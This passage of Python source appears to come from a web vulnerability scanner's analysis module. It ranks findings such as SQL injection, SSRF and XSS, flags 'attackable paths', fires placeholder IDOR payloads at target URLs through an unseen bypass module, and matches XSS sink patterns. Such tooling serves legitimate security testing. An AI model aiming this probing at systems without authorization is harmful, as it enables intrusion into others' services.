    })
    # --- PATCH 3C: costruzione sezioni robuste ---
    top10_ascii         = build_top10_ascii(rows, features)
    quality_gate_ascii  = quality_gate_ascii if 'quality_gate_ascii' in locals() else ""
    family_sources_ascii= family_sources_ascii if 'family_sources_ascii' in locals() else ""
    cookie_audit_ascii  = cookie_audit_ascii if 'cookie_audit_ascii' in locals() else ""
    full_table_ascii    = full_table_ascii if 'full_table_ascii' in locals() else ""

    sections = {  # <-- DICT, non stringa!
        "top10_ascii": top10_ascii,
        "quality_gate_ascii": quality_gate_ascii,
        "family_sources_ascii": family_sources_ascii,
        "cookie_audit_ascii": cookie_audit_ascii,
        "full_table_ascii": full_table_ascii,
        # opzionali per compatibilità con codice legacy:
        "cards": [], "quality_gate": {}, "family_sources": {}, "cookie_audit": {}, "full_table": {}
    }

    # ASCII finale (accetta dict o stringa)
    output["ascii"] = render_full_ascii_report(sections)
    # metti anche in output qualcosa di strutturato se il tuo codice a valle lo usa:
    output["attackable_cards"] = sections.get("cards") or []


    return output


# ──────────────────────────────────────────────────────────────────────────────
# Reflection context — more precise classification (upgrade)

_JS_ATTRS = ("onerror=", "onload=", "onclick=", "onmouseover=", "onfocus=", "oninput=")

def _validate_reflection_context(record: Dict[str, Any], reflections: List[str]) -> str:  # type: ignore[override]
    """
    Improved version: detect likely JS execution sinks vs inert echoes.
    Returns: 'critical' or 'low'
    """
    body = (record.get("body_snippet") or record.get("body") or "")
    b_low = body.lower()
    # Heuristic: if any JS attribute present near payload token or script tag exists, treat critical
    has_script = "<script" in b_low
    has_js_attr = any(attr in b_low for attr in _JS_ATTRS)
    # If content-type is HTML and any dangerous pattern exists, upgrade to critical
    ctype = (record.get("content_type") or "").lower()
    if ("html" in ctype) and (has_script or has_js_attr):
        return "critical"
    # If payload token appears within a quoted attribute region (rough heuristic)
    if any(q in body for q in ('="', "='")) and any(tok in body for tok in reflections):
        if any(attr.replace("=", "") in b_low for attr in _JS_ATTRS):
            return "critical"
    return "low"

# ──────────────────────────────────────────────────────────────────────────────
# Optional severity mapping & quick sort utilities

_SEV_ORDER = {"HIGH": 3, "MED": 2, "LOW": 1}

def compute_severity(record: Dict[str, Any]) -> str:
    """
    Map confidence + reason_codes to a severity bucket.
    """
    conf = (record.get("confidence") or "LOW").upper()
    rc = set(record.get("reason_codes") or [])
    sev = "LOW"
    if conf == "HIGH" or rc.intersection({RC["E_SQL_ERR"], RC["E_RCE_ERR"], RC["W_SSRF"], RC["W_LFI"]}):
        sev = "HIGH"
    elif conf == "MED":
        sev = "MED"
    record["severity"] = sev
    return sev

def sort_rows_default(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Sort rows by severity, score, and psi.
    """
    def _key(r):
        return (
            -_SEV_ORDER.get(compute_severity(r), 1),
            -_safe_float(r.get("score")),
            -_safe_float(r.get("psi_score")),
            r.get("url") or "",
        )
    return sorted(rows or [], key=_key)

# ──────────────────────────────────────────────────────────────────────────────
# Extra: compact single-line per-card textual summaries (for logs/export)

def summarize_card(card: Dict[str, Any]) -> str:
    fam = str(card.get("family") or "-")
    conf = str(card.get("confidence") or "-")
    url = str(card.get("url") or "-")
    rank = str(card.get("rank") or "-")
    reasons = str(card.get("reasons") or "-")
    return f"[{rank}] {conf} {fam} :: {url} :: {reasons}"

# ──────────────────────────────────────────────────────────────────────────────
# Public API update (__all__)

__all__ = list(sorted(set(__all__ + [
    "set_features",
    "attach_render_context_hook",
    "finalize_report_hook",
    "compute_severity",
    "sort_rows_default",
    "summarize_card",
])))

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Sanity checks, ranking helpers, dedup by signature, JSON export (fail-soft)

import json
from copy import deepcopy

def sanitize_record_minimal(record: Dict[str, Any]) -> Dict[str, Any]:
    r = dict(record or {})
    r.setdefault("url", "")
    r.setdefault("method", r.get("meth") or "GET")
    r.setdefault("status", r.get("status") or 0)
    r.setdefault("size", r.get("size") or 0)
    r.setdefault("latency", r.get("latency") or 0)
    r.setdefault("headers", r.get("headers") or {})
    r.setdefault("body_snippet", r.get("body_snippet") or r.get("body") or "")
    r.setdefault("content_type", r.get("content_type") or r.get("type") or "")
    _ensure_lists(r)
    return r

def sanitize_rows(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    return [sanitize_record_minimal(x) for x in (rows or [])]

def rank_rows(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Attach rank_score to each row using contract-like formula:
      rank_score = 100*score + 20*psi_score + 10*ab_confidence + flag_weight + family_weight - penalty(sig_dup)
    Dedup will be handled separately; this function just annotates.
    """
    seen_sig = set()
    for r in rows or []:
        score = _safe_float(r.get("score"))
        psi = _safe_float(r.get("psi_score"))
        ab = _safe_float(r.get("ab_confidence"))
        fw = _flags_weight(r)
        famw = _family_weight(r)
        base = 100.0 * score + 20.0 * psi + 10.0 * ab + fw + famw
        penalty = 0.0
        sig = r.get("sig_key")
        if sig in seen_sig and sig:
            penalty = 10.0
        r["rank_score"] = round(base - penalty, 2)
        if sig:
            seen_sig.add(sig)
    return rows

def dedup_rows_by_sig(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Keep the highest rank_score per sig_key; if no sig_key, keep row.
    """
    best: Dict[str, Dict[str, Any]] = {}
    no_sig: List[Dict[str, Any]] = []
    for r in rows or []:
        key = r.get("sig_key")
        if not key:
            no_sig.append(r)
            continue
        prev = best.get(key)
        if prev is None or _safe_float(r.get("rank_score")) > _safe_float(prev.get("rank_score")):
            best[key] = r
    result = list(best.values()) + no_sig
    result.sort(key=lambda x: (-_safe_float(x.get("rank_score")), x.get("url") or ""))
    return result

def export_rows_json(rows: List[Dict[str, Any]], pretty: bool = False) -> str:
    try:
        if pretty:
            return json.dumps(rows, indent=2, ensure_ascii=False)
        return json.dumps(rows, separators=(",", ":"), ensure_ascii=False)
    except Exception as e:
        log.warning("export_rows_json failed: %r", e)
        return "[]"

# ──────────────────────────────────────────────────────────────────────────────
# Legend / Help ASCII (fallback)

def render_legend() -> str:
    lines = []
    lines.append("════════════════════════════════ LEGEND / HELP ════════════════════════════════════════════")
    lines.append("CONF: Combined confidence (A/B + PSI + Facts). HIGH only if strong multi-signals.")
    lines.append("REASONS: Standard codes, e.g., E-SQL-ERR, C-CORS-CRED, H-HSTS-MISS, W-SSRF, W-LFI, E-RCE-ERR.")
    lines.append("SIG: Canonical signature (normalized path + sorted params) used for dedup.")
    lines.append("CONTEXT: PSI hits, Edge/Origin (TTL hints), WAF source.")
    lines.append("QUALITY GATE: Run snapshot (totals, corroboration ratio, latency p95/IQR).")
    lines.append("FAMILY SOURCES: Share of KB vs AI categories used to classify endpoints.")
    lines.append("COOKIE & CACHE AUDIT: Only sensitive paths (/login,/account,/api).")
    return "\n".join(lines) + "\n"

# ──────────────────────────────────────────────────────────────────────────────
# Enterprise hooks: partial upgrade toggles and consistency checks

def validate_features(features: Optional[Dict[str, Any]]) -> Dict[str, Any]:
    f = dict(features or {})
    f.setdefault("features", {})
    fe = f["features"]
    # Ensure known flags present (no-op if already set)
    for k in ("psi","signature","error_facts","family_ai","ab_evidence","confidence",
              "cookie_cache_audit","edge_origin","robust_latency","negative_controls",
              "baseline_refine","attackable_paths","quality_gate","family_sources"):
        fe.setdefault(k, True)
    return f

def ensure_minimum_contract(record: Dict[str, Any]) -> Dict[str, Any]:
    r = sanitize_record_minimal(record)
    r.setdefault("psi_score", 0.0)
    r.setdefault("psi_hits", [])
    r.setdefault("sig_path", urlparse(r.get("url") or "").path or "/")
    r.setdefault("sig_params", [])
    r.setdefault("sig_params_count", 0)
    r.setdefault("sig_key", r["sig_path"] + "?{}")
    r.setdefault("error_class", None)
    r.setdefault("reason_codes", [])
    r.setdefault("family", None)
    r.setdefault("family_source", None)
    r.setdefault("family_ai_score", None)
    r.setdefault("ab_evidence", None)
    r.setdefault("ab_confidence", 0.0)
    r.setdefault("confidence", "LOW")
    r.setdefault("cookie_audit", None)
    r.setdefault("edge", None)
    r.setdefault("waf_source", None)
    r.setdefault("lat_p95", r.get("latency") or 0)
    r.setdefault("lat_iqr", 0)
    r.setdefault("lat_is_capped", False)
    return r

def ensure_rows_minimum_contract(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    return [ensure_minimum_contract(r) for r in (rows or [])]

# ──────────────────────────────────────────────────────────────────────────────
# Optional CLI entry-point (reads JSON lines of records, writes ASCII)

def _cli_main(argv: Optional[List[str]] = None) -> int:
    import argparse, sys, pathlib
    p = argparse.ArgumentParser(prog="analysis_extend", add_help=True)
    p.add_argument("-i","--input", type=str, help="Input JSON file (array of records). If omitted, read STDIN.")
    p.add_argument("-k","--kb", type=str, help="KB file (JSON/YAML) optional.")
    p.add_argument("-c","--config", type=str, help="Features/config (JSON/YAML).")
    p.add_argument("--page", type=int, default=1)
    p.add_argument("--per-page", type=int, default=20)
    p.add_argument("--json", action="store_true", help="Output enriched rows as JSON instead of ASCII.")
    p.add_argument("--legend", action="store_true", help="Print legend and exit.")
    args = p.parse_args(argv or [])

    if args.legend:
        sys.stdout.write(render_legend())
        return 0

    def _read_text(path: Optional[str]) -> str:
        if not path:
            return sys.stdin.read()
        try:
            return pathlib.Path(path).read_text(encoding="utf-8")
        except Exception as e:
            log.warning("Unable to read %s: %r", path, e)
            return ""

    raw = _read_text(args.input)
    try:
        rows = json.loads(raw) if raw.strip() else []
    except Exception as e:
        log.warning("Failed to parse input JSON: %r", e)
        rows = []

    kb_obj = {}
    kb_raw = _read_text(args.kb)
    if kb_raw.strip():
        try:
            if kb_raw.strip().startswith("{"):
                kb_obj = json.loads(kb_raw)
            else:
                try:
                    import yaml  # optional
                    kb_obj = yaml.safe_load(kb_raw) or {}
                except Exception:
                    kb_obj = {}
        except Exception as e:
            log.warning("Failed to parse KB: %r", e)

    features = {}
    cfg_raw = _read_text(args.config)
    if cfg_raw.strip():
        try:
            if cfg_raw.strip().startswith("{"):
                features = json.loads(cfg_raw)
            else:
                try:
                    import yaml  # optional
                    features = yaml.safe_load(cfg_raw) or {}
                except Exception:
                    features = {}
        except Exception as e:
            log.warning("Failed to parse features/config: %r", e)

    features = validate_features(features)

    rows = ensure_rows_minimum_contract(rows)
    result = process_and_render(rows, kb=kb_obj, features=features, output={}, page=args.page, per_page=args.per_page)

    if args.json:
        sys.stdout.write(export_rows_json(result.get("rows") or [], pretty=True))
    else:
        sys.stdout.write(result.get("ascii") or "No output.\n")
    return 0

if __name__ == "__main__":  # pragma: no cover
    import sys
    sys.exit(_cli_main(sys.argv[1:]))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Policy-driven weights for ranking (optional). If policy.flag_weights() /
# policy.family_weights() exist, use them; otherwise fall back to defaults.

_FLAG_WEIGHTS: Dict[str, float] = {
    # vulnerability tag (upper) -> weight contribution
    "SQLI": 1.0,
    "RCE": 1.0,
    "SSRF": 0.9,
    "IDOR": 0.7,
    "OPENREDIR": 0.4,
    "XSS": 0.5,
    "LFI": 0.9,
    "XXE": 0.8,
    "DESERIAL": 0.8,
    "JWT": 0.6,
    "CORS": 0.4,
    "AUTH": 0.7,
    "MASSASSIGN": 0.6,
    "WEAKHDRS": 0.3,
}

_FAMILY_WEIGHTS: Dict[str, float] = {
    # family name (upper) -> weight
    "API": 1.0,
    "AUTH": 1.0,
    "WEBPAGE": 0.4,
    "STATIC": 0.2,
}

def init_weights_from_policy() -> None:
    """
    Try to pull flag/family weights from policy module. Fail-soft.
    """
    global _FLAG_WEIGHTS, _FAMILY_WEIGHTS
    # flag_weights
    try:
        if policy and hasattr(policy, "flag_weights"):
            fw = policy.flag_weights()  # type: ignore
            if isinstance(fw, dict) and fw:
                # normalize keys upper
                _FLAG_WEIGHTS = {str(k).upper(): float(v) for k, v in fw.items()}
    except Exception as e:
        log.warning("policy.flag_weights failed: %r; keep defaults", e)
    # family_weights
    try:
        if policy and hasattr(policy, "family_weights"):
            fw = policy.family_weights()  # type: ignore
            if isinstance(fw, dict) and fw:
                _FAMILY_WEIGHTS = {str(k).upper(): float(v) for k, v in fw.items()}
    except Exception as e:
        log.warning("policy.family_weights failed: %r; keep defaults", e)


# Adjust set_features to call the above
def set_features(features: Optional[Dict[str, Any]]) -> None:  # type: ignore[override]
    global _CURRENT_FEATURES
    _CURRENT_FEATURES = features or {}
    # initialize policy-driven weights if available
    init_weights_from_policy()


# Override helpers to use policy-driven weights

def _flags_weight(r: Dict[str, Any]) -> float:  # type: ignore[override]
    """
    Compute weight contribution based on flags/reasons using policy-driven weights.
    """
    flags = (r.get("flags") or "") + " " + " ".join(r.get("reason_codes") or [])
    f = flags.upper()
    w = 0.0
    for key, inc in _FLAG_WEIGHTS.items():
        if key in f:
            w += float(inc)
    return w


def _family_weight(r: Dict[str, Any]) -> float:  # type: ignore[override]
    fam = (r.get("family") or r.get("type") or "").upper()
    if not fam and "/api" in (r.get("url") or "").lower():
        fam = "API"
    return float(_FAMILY_WEIGHTS.get(fam, 0.0))


# ──────────────────────────────────────────────────────────────────────────────
# Placeholders resolution for ab_compare (optional helper)
# If your ab_compare implementation understands placeholders, you can skip this.
# Otherwise, normalize placeholder tokens to concrete values using baseline context.

def resolve_payload_placeholders(record: Dict[str, Any], payloads: Dict[str, Any]) -> Dict[str, Any]:
    """
    Replace abstract placeholders (e.g., __ID+1__) with concrete values inferred from params.
    Fail-soft: if no baseline value, leave as-is.
    """
    params = _extract_params(record)
    out = deepcopy(payloads)

    def _resolve(token: str, base: str) -> str:
        try:
            if token == "__ID+1__":
                return str(int(base) + 1)
            if token == "__ID-1__":
                val = max(0, int(base) - 1)
                return str(val)
        except Exception:
            return base
        return base

    for fam, lst in out.items():
        if not isinstance(lst, list):
            continue
        for item in lst:
            if not isinstance(item, dict):
                continue
            p = item.get("param")
            if p and p in params:
                v = str(item.get("value", ""))
                if "__ID+1__" in v:
                    item["value"] = _resolve("__ID+1__", params[p])
                if "__ID-1__" in v:
                    item["value"] = _resolve("__ID-1__", params[p])
    return out


# Wrap payload builder in placeholder resolver before ab_compare

def extend_ab_evidence(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:  # type: ignore[override]
    if not (analysis_bypass and hasattr(analysis_bypass, "ab_compare")):
        log.warning("analysis_bypass.ab_compare missing; skipping A/B evidence")
        record.setdefault("ab_confidence", 0.0)
        return

    params = _extract_params(record)
    payloads = _build_payloads_for_record(record, params)
    try:
        payloads = resolve_payload_placeholders(record, payloads)
    except Exception as e:
        log.warning("resolve_payload_placeholders failed: %r (continuing with raw payloads)", e)

    url = record.get("url") or ""
    evidence_bag = {}
    max_conf = 0.0
    try:
        res = analysis_bypass.ab_compare(url, params, payloads)  # type: ignore
        if isinstance(res, dict):
            evidence_bag = res
            max_conf = _aggregate_ab_confidence(res, record)
    except Exception as e:
        log.warning("ab_compare failed for URL=%s: %r", url, e)

    # Reflection context classification
    try:
        refl = _collect_reflections(evidence_bag)
        if refl:
            level = _validate_reflection_context(record, refl)
            _add_reason(record, RC["E_REFLECT_CRIT"] if level == "critical" else RC["E_REFLECT_LOW"])
    except Exception as e:
        log.warning("validate_reflection_context failed: %r", e)

    # Map markers/families to reasons (extended)
    _markers_to_reasons(record, evidence_bag)

    # Baseline refinement (if available on record)
    try:
        refine_evidence_with_baseline(record)
    except Exception as e:
        log.warning("refine_evidence_with_baseline failed: %r", e)

    record["ab_evidence"] = evidence_bag or None
    record["ab_confidence"] = round(max_conf, 4)


# ──────────────────────────────────────────────────────────────────────────────
# Optional hooks to integrate with orch_report using feature flags from config.yaml

def attach_render_context_adapter(record: Dict[str, Any], config: Optional[Dict[str, Any]] = None, kb: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Adapter intended to be imported by orch_report.attach_render_context().
    - Reads feature flags from config dict under 'features'.
    - Calls enrich_record(record, kb, features).
    """
    features = (config or {}).get("features") if isinstance(config, dict) else {}
    features = validate_features({"features": features or {}})
    return enrich_record(record, kb=kb or {}, features=features)

def finalize_report_adapter(rows: List[Dict[str, Any]], output: Dict[str, Any], config: Optional[Dict[str, Any]] = None, kb: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Adapter intended to be imported by orch_report.main_orchestrator().
    - Applies batch steps under current feature flags.
    - Updates output with sections and ascii (if needed).
    """
    features = (config or {}).get("features") if isinstance(config, dict) else {}
    features = validate_features({"features": features or {}})
    return finalize_report_hook(rows, output=output or {}, features=features, page=1, per_page=20)


# ──────────────────────────────────────────────────────────────────────────────
# Safety: minimal self-test harness (no network; purely structural)

def _selftest_minimal() -> Dict[str, Any]:
    """
    Run a minimal structural self-test on synthetic data to validate fail-soft paths.
    """
    fake_rows = [{
        "url": "https://api.example.com/v1/items?id=1",
        "method": "GET",
        "status": 500,
        "size": 12400,
        "latency": 210,
        "headers": {"Content-Type": "application/json", "Server": "cloudflare", "cf-ray": "abc"},
        "body_snippet": "SQL syntax error near 'SELECT'",
        "content_type": "application/json",
        "params": {"id": "1"},
        "score": 0.95,
        "dns_ttl": 3600,
    },{
        "url": "https://auth.example.com/login?user=u&pwd=p",
        "method": "POST",
        "status": 200,
        "size": 3100,
        "latency": 180,
        "headers": {
            "Content-Type": "text/html",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Credentials": "true",
            "Set-Cookie": "session=abc; Path=/; SameSite=None",
            "Cache-Control": "public",
            "cf-ray": "def",
        },
        "body_snippet": "<html>ok</html>",
        "content_type": "text/html",
        "params": {"user": "u","pwd":"p"},
        "score": 0.87,
        "dns_ttl": 60,
    }]
    feats = validate_features({"features": {
        "psi": True, "signature": True, "error_facts": True, "family_ai": True,
        "ab_evidence": True, "confidence": True, "cookie_cache_audit": True,
        "edge_origin": True, "robust_latency": True, "negative_controls": True,
        "baseline_refine": True, "attackable_paths": True, "quality_gate": True,
        "family_sources": True
    }})
    res = process_and_render(fake_rows, kb={}, features=feats, output={}, page=1, per_page=20)
    return res

# Keep __all__ updated with new adapters/utilities
__all__ = list(sorted(set(__all__ + [
    "init_weights_from_policy",
    "resolve_payload_placeholders",
    "attach_render_context_adapter",
    "finalize_report_adapter",
    "_selftest_minimal",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Versioning & contract constants

VERSION = "1.0.0-EXT"

DATA_CONTRACT_FIELDS = [
    "psi_score", "psi_hits",
    "sig_path", "sig_params", "sig_params_count", "sig_key",
    "error_class", "reason_codes",
    "family", "family_source", "family_ai_score",
    "ab_evidence", "ab_confidence",
    "confidence",
    "lat_p95", "lat_iqr", "lat_is_capped",
    "cookie_audit",
    "edge", "waf_source",
]

def data_contract_ok(record: Dict[str, Any]) -> bool:
    """
    Quick check that required render_ready fields are present (or safely defaulted).
    """
    r = ensure_minimum_contract(record)
    for f in DATA_CONTRACT_FIELDS:
        if f not in r:
            return False
    return True

# ──────────────────────────────────────────────────────────────────────────────
# Attackable paths section attachers (to mirror orch_report contract)

def attach_attackable_paths_section(output: Dict[str, Any], cards: List[Dict[str, Any]]) -> None:
    """
    Attach Top10 cards into output dict under stable keys; include compact ASCII.
    """
    if not isinstance(output, dict):
        return
    output["attackable_paths_cards"] = cards or []
    try:
        output["attackable_paths_ascii"] = render_attackable_paths(cards or [])
    except Exception as e:
        log.warning("attach_attackable_paths_section render failed: %r", e)
        output["attackable_paths_ascii"] = ""

# ──────────────────────────────────────────────────────────────────────────────
# Report tail (Menu) ASCII fallback

def render_menu_tail() -> str:
    lines = []
    lines.append("Select an option:\n")
    lines.append("1 - Start Scan")
    lines.append("2 - Ingest File or URL")
    lines.append("3 - Config")
    lines.append("4 - Legend / Help")
    lines.append("9 - Doctor (preflight)")
    lines.append("0 - Exit")
    return "\n".join(lines) + "\n"

def render_full_ascii_report_with_menu(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:
    """
    Full ASCII report with tail menu (fallback).
    """
    rpt = render_full_ascii_report(rows, sections=sections, page=page, per_page=per_page)
    return rpt + "\n" + render_menu_tail()

# ──────────────────────────────────────────────────────────────────────────────
# Confidence numeric accessor (useful for ranking / external)

def compute_confidence_score_value(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> float:
    """
    Return the numeric combined confidence before bucketing into HIGH/MED/LOW.
    """
    W = (features or {}).get("conf_weights") or DEFAULTS["CONF_WEIGHTS"]
    ab = _safe_float(record.get("ab_confidence"))
    psi = _safe_float(record.get("psi_score"))
    facts = _reasons_strength(record.get("reason_codes") or [])
    score = W["ab"] * ab + W["psi"] * psi + W["facts"] * facts
    return round(min(1.0, max(0.0, score)), 4)

# ──────────────────────────────────────────────────────────────────────────────
# Family/AI usage counters (explicit per-row mark helpers)

def mark_family_source_kb(record: Dict[str, Any], family: Optional[str]) -> None:
    if family:
        record["family"] = family
        record["family_source"] = "KB"

def mark_family_source_ai(record: Dict[str, Any], family: Optional[str], score: Optional[float]) -> None:
    if family:
        record["family"] = family
        record["family_source"] = "AI"
        if score is not None:
            record["family_ai_score"] = float(score)

# ──────────────────────────────────────────────────────────────────────────────
# Compact JSON summary for external dashboards

def build_compact_summary(rows: List[Dict[str, Any]], sections: Dict[str, Any]) -> Dict[str, Any]:
    """
    Produce a compact summary JSON for dashboards/APIs.
    """
    top = sections.get("cards") or []
    qg = sections.get("quality_gate_snapshot") or {}
    fs = sections.get("family_sources_snapshot") or {}
    return {
        "version": VERSION,
        "top10": [
            {
                "rank": c.get("rank"),
                "url": c.get("url"),
                "family": c.get("family"),
                "conf": c.get("confidence"),
                "flags": c.get("flags"),
                "reasons": c.get("reasons"),
            } for c in top
        ],
        "quality_gate": qg,
        "family_sources": fs,
        "stats": {
            "rows": len(rows),
            "high": sum(1 for r in rows if r.get("confidence") == "HIGH"),
            "med": sum(1 for r in rows if r.get("confidence") == "MED"),
            "low": sum(1 for r in rows if r.get("confidence") == "LOW"),
        }
    }

# ──────────────────────────────────────────────────────────────────────────────
# Integration hints for orch_report (call sites)
#
# In orch_report.attach_render_context():
#     from analysis_extend import attach_render_context_hook
#     record = attach_render_context_hook(record, kb=<kb>, features=<config>)
#
# In orch_report.main_orchestrator():
#     from analysis_extend import finalize_report_hook
#     output = finalize_report_hook(rows, output={}, features=<config>, page=1, per_page=20)
#
# If you want to render ASCII from CLI:
#     from analysis_extend import process_and_render
#     res = process_and_render(rows, kb=<kb>, features=<config>)
#     print(res["ascii"])

# ──────────────────────────────────────────────────────────────────────────────
# Additional ASCII helpers (bar charts / small widgets)

def _bar(percent: float, width: int = 24) -> str:
    pct = max(0.0, min(1.0, percent))
    full = int(round(pct * width))
    return "█" * full

def render_kpi_bar(label: str, percent: float) -> str:
    bar = _bar(percent)
    pct = int(round(percent * 100))
    return f"{label:<10} {bar:<24}  {pct}%"

def render_small_kpis(rows: List[Dict[str, Any]]) -> str:
    alln = len(rows)
    if alln == 0:
        return ""
    high = sum(1 for r in rows if r.get("confidence") == "HIGH")
    med = sum(1 for r in rows if r.get("confidence") == "MED")
    kb = sum(1 for r in rows if r.get("family_source") == "KB")
    ai = sum(1 for r in rows if r.get("family_source") == "AI")
    lines = []
    lines.append("════════════════════════════════ KPIs (compact) ═══════════════════════════════════════════")
    lines.append(render_kpi_bar("HIGH", high / alln))
    lines.append(render_kpi_bar("MED", med / alln))
    lines.append(render_kpi_bar("KB", kb / alln))
    lines.append(render_kpi_bar("AI", ai / alln))
    return "\n".join(lines) + "\n"

# ──────────────────────────────────────────────────────────────────────────────
# Defensive null-coalescing helpers for robustness across heterogeneous records

def coalesce_str(*vals: Any, default: str = "") -> str:
    for v in vals:
        if isinstance(v, str) and v:
            return v
    return default

def coalesce_int(*vals: Any, default: int = 0) -> int:
    for v in vals:
        try:
            return int(v)
        except Exception:
            continue
    return default

def coalesce_float(*vals: Any, default: float = 0.0) -> float:
    for v in vals:
        try:
            return float(v)
        except Exception:
            continue
    return default

# ──────────────────────────────────────────────────────────────────────────────
# JSON schema-ish descriptor (informal; for validation/testing utilities)

FEATURE_SCHEMA = {
    "features": {
        "psi": bool,
        "signature": bool,
        "error_facts": bool,
        "family_ai": bool,
        "ab_evidence": bool,
        "confidence": bool,
        "cookie_cache_audit": bool,
        "edge_origin": bool,
        "robust_latency": bool,
        "negative_controls": bool,
        "baseline_refine": bool,
        "attackable_paths": bool,
        "quality_gate": bool,
        "family_sources": bool,
    }
}

def validate_config_shape(cfg: Dict[str, Any]) -> bool:
    if not isinstance(cfg, dict):
        return False
    feats = cfg.get("features")
    if feats is None:
        return True
    if not isinstance(feats, dict):
        return False
    # allow missing keys; only type-check present ones
    for k, v in feats.items():
        if not isinstance(v, bool):
            return False
    return True

# ──────────────────────────────────────────────────────────────────────────────
# Optional: Minimal stub to produce the exact order required by UI (Top10 → QG → FS → Cookie → Table → Menu)

def render_ascii_in_required_order(rows: List[Dict[str, Any]], output: Dict[str, Any], page: int = 1, per_page: int = 20) -> str:
    cards = output.get("attackable_cards") or []
    qg = output.get("quality_gate_snapshot") or {}
    fs = output.get("family_sources_snapshot") or {}
    cookie_rows = output.get("cookie_rows") or []
    parts = [
        render_attackable_paths(cards),
        render_quality_gate(qg),
        render_family_sources(fs),
        render_cookie_audit(cookie_rows),
        render_full_results_table(rows, page=page, per_page=per_page),
        render_menu_tail(),
    ]
    return "\n".join(p.strip("\n") for p in parts if p)

# ──────────────────────────────────────────────────────────────────────────────
# Final API surface reinforcement

__all__ = list(sorted(set(__all__ + [
    "VERSION",
    "DATA_CONTRACT_FIELDS",
    "data_contract_ok",
    "attach_attackable_paths_section",
    "render_menu_tail",
    "render_full_ascii_report_with_menu",
    "compute_confidence_score_value",
    "mark_family_source_kb",
    "mark_family_source_ai",
    "build_compact_summary",
    "render_kpi_bar",
    "render_small_kpis",
    "coalesce_str",
    "coalesce_int",
    "coalesce_float",
    "FEATURE_SCHEMA",
    "validate_config_shape",
    "render_ascii_in_required_order",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Advanced (enterprise) placeholders with fail-soft WARNINGS.
# These stubs let you enable feature flags without breaking the pipeline.
# When underlying capabilities are absent, they annotate hints or WARN.

# Extend reason codes for advanced gaps
RC.update({
    "XSS_STORED_SUSPECT": "W-XSS-STORED-SUSPECT",
    "XSS_DOM_SUSPECT": "W-XSS-DOM-SUSPECT",
    "OOB_REQUIRED": "W-OOB-REQUIRED",
    "JWT_ALG_NONE_HINT": "W-JWT-ALG-NONE-HINT",
    "JWT_KID_INJECT_HINT": "W-JWT-KID-INJECT-HINT",
    "DESERIAL_GADGET_HINT": "W-DESERIAL-GADGET-HINT",
    "SSTI_HINT": "W-SSTI-HINT",
    "SMUGGLE_HINT": "W-SMUGGLE-HINT",
    "GRAPHQL_HINT": "W-GRAPHQL-HINT",
    "UPLOAD_CT_CONFUSION": "W-UPLOAD-CT-CONFUSION",
    "MASSASSIGN_STATE_HINT": "W-MASSASSIGN-STATE-HINT",
    "IDOR_CROSS_HINT": "W-IDOR-CROSS-HINT",
})

# Feature switches (off by default unless config enables)
_ADV_FEATURES = [
    "xss_advanced",          # stored/dom
    "oob_channels",          # DNS/HTTP canary infra
    "jwt_crypto",            # real sig/alg/JWKS checks
    "deserialization_gadgets",
    "ssti",
    "smuggling",
    "graphql_uploads",
    "massassign_state",
    "idor_cross_account",
    "baseline_per_endpoint", # learning + reuse across runs
]

def _advanced_enabled(name: str) -> bool:
    return _feature(name, False)

# ──────────────────────────────────────────────────────────────────────────────
# Advanced enrichers (placeholders/hints, safe no-ops)

def extend_xss_advanced(record: Dict[str, Any]) -> None:
    """
    Hints for Stored/DOM XSS when no headless/persistence is available.
    """
    if not _advanced_enabled("xss_advanced"):
        return
    ctype = (record.get("content_type") or "").lower()
    body = (record.get("body_snippet") or record.get("body") or "")
    # DOM-like patterns
    if "html" in ctype and re.search(r"(location\.hash|innerHTML|document\.write|eval\()", body, re.I):
        _add_reason(record, RC["XSS_DOM_SUSPECT"])
    # Stored suspicion is out-of-scope without revisit/persistence → emit WARN once
    log.warning("XSS stored detection requires persistence/revisit; marking as suspect only for URL=%s", record.get("url"))
    # Do not add stored suspect unless some sign of user content container
    if re.search(r"(comments|message|bio|profile)", (record.get("url") or "").lower()):
        _add_reason(record, RC["XSS_STORED_SUSPECT"])


def extend_oob_channels(record: Dict[str, Any]) -> None:
    """
    Mark that OOB validation would strengthen SSRF/XXE detections.
    """
    if not _advanced_enabled("oob_channels"):
        return
    # If SSRF/XXE hints exist, suggest OOB requirement
    rc = set(record.get("reason_codes") or [])
    if rc.intersection({RC["W_SSRF"], RC["W_XXE"]}):
        _add_reason(record, RC["OOB_REQUIRED"])


def extend_jwt_crypto_checks(record: Dict[str, Any]) -> None:
    """
    Placeholder: real JWT crypto checks require signing/verification.
    """
    if not _advanced_enabled("jwt_crypto"):
        return
    authz = _header_lookup(record.get("headers") or {}, "Authorization") or ""
    if "bearer " in authz.lower():
        # Heuristic hints
        _add_reason(record, RC["JWT_ALG_NONE_HINT"])
        _add_reason(record, RC["JWT_KID_INJECT_HINT"])
        log.warning("JWT crypto checks not wired (alg=none, kid). Add local crypto to finalize.")


def extend_deserialization_gadgets(record: Dict[str, Any]) -> None:
    """
    Placeholder: gadget discovery would need KB of classes/libraries.
    """
    if not _advanced_enabled("deserialization_gadgets"):
        return
    params = _extract_params(record)
    if any(re.fullmatch(r"[A-Za-z0-9+/=_\-\.]{24,}", v or "") for v in params.values()):
        _add_reason(record, RC["DESERIAL_GADGET_HINT"])
        log.warning("Deserialization gadget discovery not implemented; marked as HINT for URL=%s", record.get("url"))


def extend_ssti_checks(record: Dict[str, Any]) -> None:
    """
    Template injection hints based on echoed markers.
    """
    if not _advanced_enabled("ssti"):
        return
    body = (record.get("body_snippet") or record.get("body") or "")
